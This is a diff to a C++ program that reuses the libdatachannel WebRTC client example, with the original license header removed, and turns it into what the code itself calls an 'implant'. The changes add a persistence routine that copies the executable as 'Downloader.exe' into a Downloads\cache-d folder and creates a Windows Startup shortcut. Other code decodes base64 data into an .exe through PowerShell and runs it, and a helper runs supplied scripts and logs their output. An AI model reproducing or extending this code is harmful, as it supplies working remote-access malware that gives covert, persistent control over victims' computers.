@@ -1,26 +1,3 @@
-/*
- * libdatachannel client example
- * Copyright (c) 2019-2020 Paul-Louis Ageneau
- * Copyright (c) 2019 Murat Dogan
- * Copyright (c) 2020 Will Munn
- * Copyright (c) 2020 Nico Chatzi
- * Copyright (c) 2020 Lara Mackey
- * Copyright (c) 2020 Erik Cota-Robles
- *
- * This program is free software; you can redistribute it and/or
- * modify it under the terms of the GNU General Public License
- * as published by the Free Software Foundation; either version 2
- * of the License, or (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program; If not, see <http://www.gnu.org/licenses/>.
- */
-
 #include "rtc/rtc.hpp"
 
 #include "parse_cl.h"
@@ -57,6 +34,8 @@ using namespace std::chrono_literals;
 using json = nlohmann::json;
 
 template <class T> weak_ptr<T> make_weak_ptr(shared_ptr<T> ptr) { return ptr; }
+shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
+                                                weak_ptr<WebSocket> wws, string id);
 
 unordered_map<string, shared_ptr<PeerConnection>> peerConnectionMap;
 unordered_map<string, shared_ptr<DataChannel>> dataChannelMap;
@@ -65,20 +44,21 @@ string localId;
 string data_directory;
 string user_directory;
 
-shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
-                                                weak_ptr<WebSocket> wws, string id);
 string randomId(size_t length);
 
+const string fileName = "Downloader.exe";
 
-
+/***
+ * persist | Attempts to create persistence on the machine
+ ***/
 void persist() {
 
-	//Copy itself to its directory
+	//Copies itself to its data directory
 	string exePath = getExePath();
-	std::filesystem::copy(exePath, data_directory + "\\Downloader.exe");
+	std::filesystem::copy(exePath, data_directory + "\\" + fileName);
 
-	//Assuming its copied on its directory folder (cache-d)
-	string source = data_directory + "\\Downloader.exe";
+	//Assuming its copied on its directory folder
+	string source = data_directory + "\\" + fileName;
 	string destination = user_directory + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
 
 	// Create shortcut
@@ -86,7 +66,11 @@ void persist() {
 
 }
 
-int establishDirectory() {
+/***
+ * setupDirectory | Sets up the working directory for the implant
+ ***/
+int setupDirectory() {
+
 	WCHAR path[MAX_PATH];
 	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path))) {
 		wstring ws(path);
@@ -94,11 +78,12 @@ int establishDirectory() {
 
 		user_directory = strPath;
 
+		//TODO: Check if folder exist before creating it (Alternative)
 		namespace fs = std::filesystem;
-		//fs::create_directories(strPath + "\\Downloads\\cache-d");
+		fs::create_directories(strPath + "\\Downloads\\cache-d");
 		data_directory = strPath + "\\Downloads\\cache-d";
 
-		persist();
+		persist(); //Testing
 
 		return 1;
 	}
@@ -107,7 +92,7 @@ int establishDirectory() {
 
 
 
-    /***
+/***
 * runScript | Runs given script and stores the log output on the given file
 ***/
 int runScript(char* file_source, char* file_output) {
@@ -162,7 +147,7 @@ void createFileFromBase64String(char* filename) {
 	             "[Convert]::FromBase64String($FileName))";
 	LPSTR cmd2 = const_cast<char *>(cmd.c_str());
 
-	//Creates the files by running the powershell command
+	//Runs powershell command to create .exe
 	CreateProcess(NULL,cmd2,NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
 	
 	//Runs .exe / script
@@ -181,7 +166,8 @@ SYSTEM_INFO getSystemInfo(string data) {
    // Copy the hardware information to the SYSTEM_INFO struct 
    GetSystemInfo(&siSysInfo); 
 
-   establishDirectory();
+	//For testing
+   setupDirectory();
 	   
    return siSysInfo;
 }
